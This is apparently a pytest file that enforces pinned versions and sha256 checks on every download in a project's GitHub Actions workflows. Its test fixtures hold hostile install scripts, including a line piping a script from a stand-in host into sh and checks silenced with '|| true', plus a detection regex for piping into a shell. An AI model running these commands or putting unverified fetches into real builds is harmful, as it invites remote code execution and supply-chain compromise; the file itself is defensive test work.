"""Every tool a workflow downloads is pinned and checksummed (M13-65).

From the reviews of #278 (M13-42): `raven-actions/actionlint` ran with its
default `version: latest`, so the actionlint binary was fetched unpinned and
unchecked on every run. The CI job now downloads it the way the gitleaks
jobs do: an exact release, checked against the sha256 in the release's
checksums file before it is unpacked.

Static: every `run:` step under `.github/workflows/` that fetches with `curl`
or `wget` must
- fetch no `latest` URL;
- reference at least one `*_VERSION` variable in each fetch URL, and set
  every one it names (step, job or workflow `env`) to an exact `x.y.z`;
- write each fetch to a file (`-o` / `-O` / `--output`), and check every such
  file by name with `echo "<digest>  <file>" | sha256sum -c -` against a
  64-hex digest (written in the script or taken from an `env` variable);
- run that check after the fetch and before any other command that names the
  file (tar, install, chmod, unzip, running it);
- write the check as a bare command on its own line, so bash -e stops on it
  (no `!`, no `if`/`while`/`until` condition, nothing such as `|| ...` or
  `; true` after it), and never pipe into a shell.

The check is line-level: it reads each line of the script on its own and
does not model the shell around it. It does not see four shell-level forms
that also stop bash -e from exiting on a failed check: `set +e` on an
earlier line, a `{ ...; } || true` group, a `( ... ) || true` subshell, and
a function that holds the check called as `fn || true`. No workflow uses
them today; review covers them (the probe
lab/core/tests/review/test_m13_65_check_swallowed_by_enclosing_shell.py
records the limit).

The mutation tests apply each failure to the real workflows in memory, and
the security review of #339 added five hostile scripts that the first version
let through; no workflow file is edited.
"""

from __future__ import annotations

import copy
import re
import shlex
from collections.abc import Iterator, Mapping
from pathlib import Path
from typing import Any

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = ROOT / ".github" / "workflows"

FETCH = re.compile(r"\b(?:curl|wget)\b")
VERSION_REF = re.compile(r"\$\{?([A-Z][A-Z0-9_]*_VERSION)\}?")
EXACT_VERSION = re.compile(r"\d+\.\d+\.\d+")
# `echo "<digest>  <path>" | sha256sum -c -`: group 1 the digest, group 2 the
# path the check reads.
CHECK = re.compile(r"""echo\s+["']?(\S+)\s+([^"'\s]+)["']?\s*\|\s*sha256sum\s+-c\s+-""")
# A check whose failure is swallowed on its own line: `|| ...` or `; true`
# after it. Line-level only: `set +e` earlier, `{ ...; } || true`,
# `( ... ) || true` and `fn || true` are not seen (module docstring).
IGNORED = re.compile(r"sha256sum\s+-c\s+-\s*(?:\|\||;\s*true\b)")
# A check must be a bare command on its own line: bash -e exits on neither a
# negated pipeline (`! echo ... | sha256sum -c -`) nor the condition of an
# `if`, `while` or `until`, and anything after it on the line can swallow it.
# A bare line still fails open inside a shell that has turned -e off around
# it; that is the documented limit in the module docstring.
BARE_CHECK = re.compile(r"echo\s+([\"'])[0-9A-Za-z_${}]+\s+[^\"'\s]+\1\s*\|\s*sha256sum\s+-c\s+-")
PIPE_TO_SHELL = re.compile(r"\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash)\b")
URL = re.compile(r"https?://[^\s\"']+")
SHA256 = re.compile(r"[0-9a-f]{64}")
VAR = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?")
# Command separators inside one logical line; a plain `|` stays inside a
# command, so `echo ... | sha256sum -c -` is one command.
SEPARATOR = re.compile(r"&&|\|\||;")


def _load(path: Path) -> dict[str, Any]:
    data = yaml.safe_load(path.read_text(encoding="utf-8"))
    assert isinstance(data, dict), path
    return data


def _workflows() -> dict[str, dict[str, Any]]:
    return {p.name: _load(p) for p in sorted(WORKFLOWS.glob("*.y*ml"))}


def _fetching_steps(
    workflow: dict[str, Any],
) -> Iterator[tuple[str, str, Mapping[str, Any]]]:
    """(where, script, env in scope) for each run step that downloads."""
    top = workflow.get("env") or {}
    for job_id, job in (workflow.get("jobs") or {}).items():
        job_env = {**top, **(job.get("env") or {})}
        for i, step in enumerate(job.get("steps") or []):
            script = step.get("run")
            if not isinstance(script, str) or not FETCH.search(script):
                continue
            env = {**job_env, **(step.get("env") or {})}
            yield f"{job_id}[{i}] {step.get('name', '')}", script, env


def _commands(script: str) -> list[str]:
    """The script's commands in order: continuations joined, split at
    newlines, `&&`, `||` and `;`."""
    joined = re.sub(r"\\\n", " ", script)
    out: list[str] = []
    for line in joined.splitlines():
        if line.strip().startswith("#"):
            continue
        out.extend(c.strip() for c in SEPARATOR.split(line) if c.strip())
    return out


def _targets(command: str) -> list[str] | None:
    """The `-o` / `-O` / `--output` targets of a curl or wget command, quotes
    removed; None if it cannot be read as a shell command."""
    try:
        words = shlex.split(command, comments=False, posix=True)
    except ValueError:
        return None
    out = []
    for i, word in enumerate(words[:-1]):
        short = re.fullmatch(r"-[A-Za-z]*[oO]", word)
        if short or word in {"--output", "--output-document"}:
            out.append(words[i + 1])
    return out


def _findings(workflow: dict[str, Any]) -> list[tuple[str, str]]:
    """(where, kind) for each rule a fetching step breaks.

    Line-level: each line and command is read on its own, so a check turned
    off by the shell around it (`set +e` earlier, `{ ...; } || true`,
    `( ... ) || true`, `fn || true`) is not reported; review covers those.
    """
    found: list[tuple[str, str]] = []
    for where, script, env in _fetching_steps(workflow):
        if "latest" in script:
            found.append((where, "latest"))
        if PIPE_TO_SHELL.search(script):
            found.append((where, "pipe-to-shell"))
        joined = re.sub(r"\\\n", " ", script)
        for line in joined.splitlines():
            if IGNORED.search(line):
                found.append((where, "check-ignored"))
            if "sha256sum" in line and not BARE_CHECK.fullmatch(line.strip()):
                found.append((where, "check-not-bare"))
        for name in VERSION_REF.findall(script):
            if not EXACT_VERSION.fullmatch(str(env.get(name, ""))):
                found.append((where, "version"))
        commands = _commands(script)
        # path -> index of the command that checks it
        checked: dict[str, int] = {}
        for i, command in enumerate(commands):
            for digest, path in CHECK.findall(command):
                ref = VAR.fullmatch(digest)
                value = str(env.get(ref.group(1), "")) if ref else digest
                if not SHA256.fullmatch(value):
                    found.append((where, "digest"))
                checked.setdefault(path, i)
        for i, command in enumerate(commands):
            if not FETCH.search(command):
                continue
            urls = URL.findall(command)
            if not any(VERSION_REF.search(u) for u in urls):
                found.append((where, "unversioned"))
            targets = _targets(command)
            if not targets:
                found.append((where, "no-target"))
                continue
            for target in targets:
                at = checked.get(target)
                if at is None or at < i:
                    found.append((where, "unchecked"))
                    continue
                # Nothing may read the downloaded file between the fetch and
                # its check: no tar, install, chmod, unzip, or running it.
                if any(target in c for c in commands[i + 1 : at]):
                    found.append((where, "used-before-check"))
    return found


def _ci() -> dict[str, Any]:
    return copy.deepcopy(_workflows()["ci.yml"])


def _actionlint_step(workflow: dict[str, Any]) -> dict[str, Any]:
    for job in workflow["jobs"].values():
        for step in job.get("steps") or []:
            if step.get("name") == "Install actionlint":
                return step  # type: ignore[no-any-return]
    raise AssertionError("ci.yml has no 'Install actionlint' step")


@pytest.mark.parametrize("name", sorted(_workflows()))
def test_every_download_is_pinned_and_checksummed(name: str) -> None:
    assert _findings(_workflows()[name]) == []


def test_ci_downloads_actionlint_and_gitleaks() -> None:
    wheres = [where for where, _, _ in _fetching_steps(_workflows()["ci.yml"])]
    assert any("Install actionlint" in w for w in wheres), wheres
    assert any("Install gitleaks" in w for w in wheres), wheres


def test_ci_does_not_use_an_actionlint_action() -> None:
    text = (WORKFLOWS / "ci.yml").read_text(encoding="utf-8")
    assert "raven-actions/actionlint" not in text


def test_a_latest_url_is_caught() -> None:
    workflow = _ci()
    step = _actionlint_step(workflow)
    step["run"] = step["run"].replace("download/v${ACTIONLINT_VERSION}", "latest/download")
    assert "latest" in {kind for _, kind in _findings(workflow)}


@pytest.mark.parametrize("version", ["latest", "1.7", "v1.7.12", "", None])
def test_an_inexact_version_is_caught(version: str | None) -> None:
    workflow = _ci()
    step = _actionlint_step(workflow)
    if version is None:
        del step["env"]["ACTIONLINT_VERSION"]
    else:
        step["env"]["ACTIONLINT_VERSION"] = version
    assert "version" in {kind for _, kind in _findings(workflow)}


def test_a_missing_check_is_caught() -> None:
    workflow = _ci()
    step = _actionlint_step(workflow)
    step["run"] = "\n".join(line for line in step["run"].splitlines() if "sha256sum" not in line)
    assert "unchecked" in {kind for _, kind in _findings(workflow)}


@pytest.mark.parametrize("digest", ["deadbeef", "${UNSET_SHA}", "X" * 64])
def test_a_bad_digest_is_caught(digest: str) -> None:
    workflow = _ci()
    step = _actionlint_step(workflow)
    step["run"] = SHA256.sub(digest, step["run"], count=1)
    assert "digest" in {kind for _, kind in _findings(workflow)}


def test_a_digest_from_env_is_resolved() -> None:
    # The actionlint step, in memory, with its digest moved into `env` the
    # way some workflows carry theirs (no other workflow file is read).
    workflow = _ci()
    step = _actionlint_step(workflow)
    step["run"] = SHA256.sub("${ACTIONLINT_SHA256}", step["run"], count=1)
    step["env"]["ACTIONLINT_SHA256"] = _SUM
    assert _findings(workflow) == []
    step["env"]["ACTIONLINT_SHA256"] = "not-a-digest"
    assert "digest" in {kind for _, kind in _findings(workflow)}
    del step["env"]["ACTIONLINT_SHA256"]
    assert "digest" in {kind for _, kind in _findings(workflow)}


# The five scripts from the security review of #339 (M13-65), each of which
# passed the first version of this check. Constructed inputs.
_URL = (
    '"https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}'
    '/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"'
)
_SUM = "8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8"
HOSTILE: Mapping[str, tuple[str, str]] = {
    "checks-b-installs-a": (
        f"curl -sSfL -o /tmp/a.tar.gz {_URL}\n"
        f"curl -sSfL -o /tmp/b.tar.gz {_URL}\n"
        f'echo "{_SUM}  /tmp/b.tar.gz" | sha256sum -c -\n'
        "tar -xzf /tmp/a.tar.gz -C /tmp actionlint\n"
        "sudo install /tmp/actionlint /usr/local/bin/actionlint\n",
        "unchecked",
    ),
    "unpacks-before-check": (
        f"curl -sSfL -o /tmp/actionlint.tar.gz {_URL}\n"
        "tar -xzf /tmp/actionlint.tar.gz -C /tmp actionlint\n"
        "sudo install /tmp/actionlint /usr/local/bin/actionlint\n"
        f'echo "{_SUM}  /tmp/actionlint.tar.gz" | sha256sum -c -\n',
        "used-before-check",
    ),
    "check-or-true": (
        f"curl -sSfL -o /tmp/actionlint.tar.gz {_URL}\n"
        f'echo "{_SUM}  /tmp/actionlint.tar.gz" | sha256sum -c - || true\n'
        "tar -xzf /tmp/actionlint.tar.gz -C /tmp actionlint\n",
        "check-ignored",
    ),
    "pipe-to-shell": (
        f"curl -sSfL -o /tmp/actionlint.tar.gz {_URL}\n"
        f'echo "{_SUM}  /tmp/actionlint.tar.gz" | sha256sum -c -\n'
        "curl -sSfL https://example.invalid/install.sh | sh\n",
        "pipe-to-shell",
    ),
    "no-version": (
        "curl -sSfL -o /tmp/actionlint.tar.gz "
        '"https://github.com/rhysd/actionlint/releases/download/v1.7.12'
        '/actionlint_1.7.12_linux_amd64.tar.gz"\n'
        f'echo "{_SUM}  /tmp/actionlint.tar.gz" | sha256sum -c -\n'
        "tar -xzf /tmp/actionlint.tar.gz -C /tmp actionlint\n",
        "unversioned",
    ),
}


@pytest.mark.parametrize("case", sorted(HOSTILE))
def test_a_hostile_install_script_is_caught(case: str) -> None:
    script, kind = HOSTILE[case]
    workflow = _ci()
    _actionlint_step(workflow)["run"] = script
    assert kind in {k for _, k in _findings(workflow)}, case


@pytest.mark.parametrize("suffix", [" || true", " || :", "; true", " || echo skipped"])
def test_every_swallowed_check_is_caught(suffix: str) -> None:
    workflow = _ci()
    step = _actionlint_step(workflow)
    step["run"] = step["run"].replace("sha256sum -c -", "sha256sum -c -" + suffix)
    assert "check-ignored" in {k for _, k in _findings(workflow)}, suffix


@pytest.mark.parametrize(
    ("prefix", "suffix"),
    [
        # From the code review of #339 (M13-65): bash -e exits on neither.
        ("! ", ""),
        ("if ! ", "; then echo skipped; fi"),
        ("if ", "; then :; fi"),
        ("while ! ", "; do break; done"),
        ("until ", "; do break; done"),
    ],
)
def test_a_negated_or_conditional_check_is_caught(prefix: str, suffix: str) -> None:
    workflow = _ci()
    step = _actionlint_step(workflow)
    lines = step["run"].splitlines()
    i = next(n for n, line in enumerate(lines) if "sha256sum" in line)
    lines[i] = prefix + lines[i].strip() + suffix
    step["run"] = "\n".join(lines)
    assert "check-not-bare" in {k for _, k in _findings(workflow)}, prefix


def test_a_check_before_the_fetch_is_caught() -> None:
    workflow = _ci()
    step = _actionlint_step(workflow)
    lines = step["run"].splitlines()
    check = next(line for line in lines if "sha256sum" in line)
    lines.remove(check)
    step["run"] = "\n".join([check, *lines])
    assert "unchecked" in {k for _, k in _findings(workflow)}
